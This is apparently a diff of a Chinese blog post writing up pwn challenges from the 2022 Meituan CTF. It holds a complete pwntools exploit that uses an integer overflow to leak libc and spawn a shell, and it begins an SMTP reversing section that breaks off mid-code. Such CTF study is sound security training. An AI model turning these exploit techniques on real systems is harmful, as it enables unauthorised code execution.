@@ -1,183 +1,380 @@
-<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>2022年 第五届美团CTF Pwn题复现 | tolele的自由小屋</title><meta name="author" content="tolele,1623093551@qq.com"><meta name="copyright" content="tolele"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="0x00：note分析程序是一个菜单选择，其中Edit函数里面存在整数溢出：  但number为负数时，会对数组反方向的数据进行操作。 同时，checksec发现PIE和canary保护机制没有开启： 1234567tolele@tolele-ubuntu22:~&#x2F;CTFgame&#x2F;2022MTCTF&#x2F;pwn $ checksec note[*] &amp;#x27;&#x2F;home&#x2F;tolele&#x2F;CTFgame">
-<meta property="og:type" content="article">
-<meta property="og:title" content="2022年 第五届美团CTF Pwn题复现">
-<meta property="og:url" content="http://example.com/2022/10/08/2022%E5%B9%B4%20%E7%AC%AC%E4%BA%94%E5%B1%8A%E7%BE%8E%E5%9B%A2CTF%20Pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/index.html">
-<meta property="og:site_name" content="tolele的自由小屋">
-<meta property="og:description" content="0x00：note分析程序是一个菜单选择，其中Edit函数里面存在整数溢出：  但number为负数时，会对数组反方向的数据进行操作。 同时，checksec发现PIE和canary保护机制没有开启： 1234567tolele@tolele-ubuntu22:~&#x2F;CTFgame&#x2F;2022MTCTF&#x2F;pwn $ checksec note[*] &amp;#x27;&#x2F;home&#x2F;tolele&#x2F;CTFgame">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/img/fen/wen02.jpg">
-<meta property="article:published_time" content="2022-10-08T07:30:30.000Z">
-<meta property="article:modified_time" content="2022-10-16T00:32:12.460Z">
-<meta property="article:author" content="tolele">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/img/fen/wen02.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2022/10/08/2022%E5%B9%B4%20%E7%AC%AC%E4%BA%94%E5%B1%8A%E7%BE%8E%E5%9B%A2CTF%20Pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
-  root: '/',
-  algolia: undefined,
-  localSearch: undefined,
-  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
-  noticeOutdate: undefined,
-  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":400},
-  copy: {
-    success: '复制成功',
-    error: '复制错误',
-    noSupport: '浏览器不支持'
-  },
-  relativeDate: {
-    homepage: false,
-    post: false
-  },
-  runtime: '天',
-  date_suffix: {
-    just: '刚刚',
-    min: '分钟前',
-    hour: '小时前',
-    day: '天前',
-    month: '个月前'
-  },
-  copyright: undefined,
-  lightbox: 'fancybox',
-  Snackbar: undefined,
-  source: {
-    justifiedGallery: {
-      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
-      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
-    }
-  },
-  isPhotoFigcaption: false,
-  islazyload: false,
-  isAnchor: false
-}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
-  title: '2022年 第五届美团CTF Pwn题复现',
-  isPost: true,
-  isHome: false,
-  isHighlightShrink: false,
-  isToc: true,
-  postUpdate: '2022-10-16 08:32:12'
-}</script><noscript><style type="text/css">
-  #nav {
-    opacity: 1
-  }
-  .justified-gallery img {
-    opacity: 1
-  }
-
-  #recent-posts time,
-  #post-meta time {
-    display: inline !important
-  }
-</style></noscript><script>(win=>{
-    win.saveToLocal = {
-      set: function setWithExpiry(key, value, ttl) {
-        if (ttl === 0) return
-        const now = new Date()
-        const expiryDay = ttl * 86400000
-        const item = {
-          value: value,
-          expiry: now.getTime() + expiryDay,
-        }
-        localStorage.setItem(key, JSON.stringify(item))
-      },
-
-      get: function getWithExpiry(key) {
-        const itemStr = localStorage.getItem(key)
-
-        if (!itemStr) {
-          return undefined
-        }
-        const item = JSON.parse(itemStr)
-        const now = new Date()
-
-        if (now.getTime() > item.expiry) {
-          localStorage.removeItem(key)
-          return undefined
-        }
-        return item.value
-      }
-    }
-  
-    win.getScript = url => new Promise((resolve, reject) => {
-      const script = document.createElement('script')
-      script.src = url
-      script.async = true
-      script.onerror = reject
-      script.onload = script.onreadystatechange = function() {
-        const loadState = this.readyState
-        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
-        script.onload = script.onreadystatechange = null
-        resolve()
-      }
-      document.head.appendChild(script)
-    })
-  
-      win.activateDarkMode = function () {
-        document.documentElement.setAttribute('data-theme', 'dark')
-        if (document.querySelector('meta[name="theme-color"]') !== null) {
-          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
-        }
-      }
-      win.activateLightMode = function () {
-        document.documentElement.setAttribute('data-theme', 'light')
-        if (document.querySelector('meta[name="theme-color"]') !== null) {
-          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
-        }
-      }
-      const t = saveToLocal.get('theme')
-    
-          if (t === 'dark') activateDarkMode()
-          else if (t === 'light') activateLightMode()
-        
-      const asideStatus = saveToLocal.get('aside-status')
-      if (asideStatus !== undefined) {
-        if (asideStatus === 'hide') {
-          document.documentElement.classList.add('hide-aside')
-        } else {
-          document.documentElement.classList.remove('hide-aside')
-        }
-      }
-    
-    const detectApple = () => {
-      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
-        document.documentElement.classList.add('apple')
-      }
-    }
-    detectApple()
-    })(window)</script><meta name="generator" content="Hexo 5.4.2"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/cropPhoto.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间线</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/top/wen02.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">tolele的自由小屋</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间线</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">2022年 第五届美团CTF Pwn题复现</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-10-08T07:30:30.000Z" title="发表于 2022-10-08 15:30:30">2022-10-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-10-16T00:32:12.460Z" title="更新于 2022-10-16 08:32:12">2022-10-16</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/">比赛复现</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="2022年 第五届美团CTF Pwn题复现"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="0x00：note"><a href="#0x00：note" class="headerlink" title="0x00：note"></a>0x00：note</h1><p>分析程序是一个菜单选择，其中Edit函数里面存在整数溢出：</p>
+<!DOCTYPE html><html lang="zh-CN"><head><title>2022年 第五届美团CTF Pwn题复现</title><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta name="viewport" content="width=device-width, initial-scale=0.5"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><link rel="stylesheet" href="/css/highlight/xcode.min.css"><link rel="stylesheet" href="/css/bootstrap/bootstrap-tooltips.css"><link rel="stylesheet" href="/css/post.css"><script src="/js/jquery.min.js"></script><meta name="generator" content="Hexo 5.4.2"></head><body><script>if (/mobile/i.test(navigator.userAgent) || /android/i.test(navigator.userAgent)) {
+  document.body.classList.add('mobile')
+}</script><div><div class="inner"><h1>2022年 第五届美团CTF Pwn题复现</h1><div class="time">2022-10-08</div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00%EF%BC%9Anote"><span class="toc-text">0x00：note</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01%EF%BC%9ASMTP"><span class="toc-text">0x01：SMTP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02%EF%BC%9A%E6%8D%89%E8%BF%B7%E8%97%8F"><span class="toc-text">0x02：捉迷藏</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03%EF%BC%9Aret2libc-aarch64"><span class="toc-text">0x03：ret2libc_aarch64</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04%EF%BC%9A%E9%A2%98%E7%9B%AE%E9%99%84%E4%BB%B6"><span class="toc-text">0x04：题目附件</span></a></li></ol><h2 id="0x00：note"><a href="#0x00：note" class="headerlink" title="0x00：note"></a>0x00：note</h2><p>分析程序是一个菜单选择，其中Edit函数里面存在整数溢出：</p>
 <p><img src="/images/2022%E5%B9%B4%20%E7%AC%AC%E4%BA%94%E5%B1%8A%E7%BE%8E%E5%9B%A2CTF%20Pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/pic01.png" alt="pic01"></p>
 <p>但number为负数时，会对数组反方向的数据进行操作。</p>
 <p>同时，checksec发现PIE和canary保护机制没有开启：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">tolele@tolele-ubuntu22:~/CTFgame/2022MTCTF/pwn $ checksec note</span><br><span class="line">[*] &#x27;/home/tolele/CTFgame/2022MTCTF/pwn/note&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x3ff000)</span><br></pre></td></tr></table></figure>
-
+<pre><code>tolele@tolele-ubuntu22:~/CTFgame/2022MTCTF/pwn $ checksec note
+[*] &#39;/home/tolele/CTFgame/2022MTCTF/pwn/note&#39;
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x3ff000)
+</code></pre>
 <p>那么，可以先试着对堆数组的下边（反方向）查看，看看有没有可利用的东西。</p>
 <p>从IDA可得知：<code>.text:0000000000401714                 call    Edit</code></p>
 <p>我们可以在0x401714处断下，然后用si步入Edit函数，在继续si直到rsp/rbp布置好后，查看栈上的内容：</p>
 <p><img src="/images/2022%E5%B9%B4%20%E7%AC%AC%E4%BA%94%E5%B1%8A%E7%BE%8E%E5%9B%A2CTF%20Pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/pic02.png" alt="pic02"></p>
 <p>第一次先泄露出libc基址，第二次再进行getshell。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./note&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./note&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x4017b3</span></span><br><span class="line">main = <span class="number">0x401679</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;5. leave&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Content:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;5. leave&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Content: &quot;</span>, content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line">edit(-<span class="number">6</span>, payload)</span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;@@@ libc_base = &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span> + p64(ret) +  p64(pop_rdi_ret) + p64(binsh) + p64(system)</span><br><span class="line">edit(-<span class="number">6</span>, payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<pre><code class="python">from pwn import *
+context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)
 
+io = process(&quot;./note&quot;)
+elf = ELF(&quot;./note&quot;)
+libc = ELF(&quot;./libc-2.31.so&quot;)
+
+puts_plt = elf.plt[&#39;puts&#39;]
+puts_got = elf.got[&#39;puts&#39;]
+pop_rdi_ret = 0x4017b3
+main = 0x401679
+
+def add(size, content):
+    io.sendlineafter(&quot;5. leave&quot;, &quot;1&quot;)
+    io.sendlineafter(&quot;Size:&quot;, str(size))
+    io.sendlineafter(&quot;Content:&quot;, content)
+
+def edit(idx, content):
+    io.sendlineafter(&quot;5. leave&quot;, &quot;3&quot;)
+    io.sendlineafter(&quot;Index: &quot;, str(idx))
+    io.sendlineafter(&quot;Content: &quot;, content)
+def debug():
+    gdb.attach(io)
+    pause()
+
+payload = b&#39;A&#39;*8 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)
+edit(-6, payload)
+libc_base = u64(io.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;)) - libc.sym[&#39;puts&#39;]
+print(&quot;@@@ libc_base = &quot; + str(hex(libc_base)))
+
+system = libc_base + libc.sym[&#39;system&#39;]
+binsh = libc_base + libc.search(b&#39;/bin/sh&#39;).__next__()
+ret = 0x40101a
+payload = b&#39;A&#39;*8 + p64(ret) +  p64(pop_rdi_ret) + p64(binsh) + p64(system)
+edit(-6, payload)
+io.interactive()
+</code></pre>
 <br>
 
-<h1 id="0x01：SMTP"><a href="#0x01：SMTP" class="headerlink" title="0x01：SMTP"></a>0x01：SMTP</h1><p>一道stmp的协议逆向题，程序比较大，先执行程序根据信息再进行分析。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// 执行程序充当服务端</span><br><span class="line">tolele@tolele-ubuntu22:~/CTFgame/2022MTCTF/pwn/smtp/docker/bin $ ./pwn</span><br><span class="line">listener: waiting for connections...     //连接前就输出的信息</span><br><span class="line">listener: got connection from 127.0.0.1  //以下为连接后输出的信息</span><br><span class="line">listener: initiated a new session worker</span><br><span class="line">session 5: starting work, state 0</span><br><span class="line">|                          //等待客户端的请求...</span><br><span class="line"></span><br><span class="line">// 连接,充当客户端</span><br><span class="line">tolele@tolele-ubuntu22:~/CTFgame/2022MTCTF/pwn/smtp/docker/bin $ nc 127.0.0.1 9999</span><br><span class="line">220 SMTP tsmtp</span><br><span class="line">|                          //等待输入请求...</span><br></pre></td></tr></table></figure>
+<h2 id="0x01：SMTP"><a href="#0x01：SMTP" class="headerlink" title="0x01：SMTP"></a>0x01：SMTP</h2><p>一道stmp的协议逆向题，程序比较大，先执行程序根据信息再进行分析。</p>
+<pre><code>// 执行程序充当服务端
+tolele@tolele-ubuntu22:~/CTFgame/2022MTCTF/pwn/smtp/docker/bin $ ./pwn
+listener: waiting for connections...     //连接前就输出的信息
+listener: got connection from 127.0.0.1  //以下为连接后输出的信息
+listener: initiated a new session worker
+session 5: starting work, state 0
+|                          //等待客户端的请求...
 
+// 连接,充当客户端
+tolele@tolele-ubuntu22:~/CTFgame/2022MTCTF/pwn/smtp/docker/bin $ nc 127.0.0.1 9999
+220 SMTP tsmtp
+|                          //等待输入请求...
+</code></pre>
 <p>有了这些信息后，接着静态分析程序：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main函数</span></span><br><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( argc == <span class="number">2</span> )</span><br><span class="line">    listener((<span class="type">char</span> *)argv[<span class="number">1</span>]);</span><br><span class="line">  listener(<span class="string">&quot;9999&quot;</span>);           <span class="comment">//不特定监听端口则默认9999</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//listener函数</span></span><br><span class="line"><span class="type">void</span> __cdecl __noreturn <span class="title function_">listener</span><span class="params">(<span class="type">char</span> *service)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...略...</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;listener: waiting for connections...&quot;</span>);  <span class="comment">//等待连接（对应已获取的信息）</span></span><br><span class="line">  epfd = epoll_create(<span class="number">16</span>);</span><br><span class="line">  event.data.fd = fd;</span><br><span class="line">  event.events = <span class="number">1</span>;</span><br><span class="line">  epoll_ctl(epfd, <span class="number">1</span>, fd, &amp;event);</span><br><span class="line">  events = (<span class="keyword">struct</span> epoll_event *)<span class="built_in">calloc</span>(<span class="number">0x10</span>u, <span class="number">0xC</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v12 = epoll_wait(epfd, events, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v12; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( fd == events[i].data.fd )</span><br><span class="line">      &#123;</span><br><span class="line">        addr_len = <span class="number">128</span>;</span><br><span class="line">        v11 = accept(fd, &amp;addr, &amp;addr_len);</span><br><span class="line">        v1 = (<span class="type">const</span> <span class="type">void</span> *)get_in_addr(&amp;addr);</span><br><span class="line">        inet_ntop(addr.sa_family, v1, buf, <span class="number">0x2E</span>u);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;listener: got connection from %s\n&quot;</span>, buf); <span class="comment">//连接</span></span><br><span class="line">        arg = <span class="built_in">malloc</span>(<span class="number">0x14</span>u);</span><br><span class="line">        *(_DWORD *)arg = v11;</span><br><span class="line">        *((_DWORD *)arg + <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">        pthread_create(&amp;newthread, <span class="number">0</span>, (<span class="type">void</span> *(*)(<span class="type">void</span> *))session_worker, arg); <span class="comment">//创建线程,去执行session_work函数</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;listener: initiated a new session worker&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// session_worker函数</span></span><br><span class="line"><span class="type">void</span> *__cdecl <span class="title function_">session_worker</span><span class="params">(<span class="type">int</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...略...</span></span><br><span class="line">  v35 = a1;</span><br><span class="line">  fd = *a1;</span><br><span class="line">  session_reset(a1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;session %d: starting work, state %d\n&quot;</span>, fd, a1[<span class="number">1</span>]);</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(off_804D0A0[<span class="number">0</span>]);</span><br><span class="line">  send(fd, off_804D0A0[<span class="number">0</span>], v1, <span class="number">0</span>);</span><br><span class="line">  <span class="comment">// ...略...</span></span><br><span class="line">  <span class="keyword">while</span> ( v35[<span class="number">1</span>] != <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v29 = epoll_wait(epfd, events, <span class="number">1</span>, timeout);</span><br><span class="line">    <span class="keyword">if</span> ( !v29 )</span><br><span class="line">    &#123;</span><br><span class="line">      close(fd);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;session %d: timeout, work is over\n&quot;</span>, fd);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v29 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x400</span>u);</span><br><span class="line">      v28 = recv(fd, s, nmemb - <span class="number">1</span>, <span class="number">0</span>);   <span class="comment">//接收到请求，赋给s</span></span><br><span class="line">      <span class="keyword">if</span> ( !v28 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;session %d: client closed connection\n&quot;</span>, fd);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v28 &lt; <span 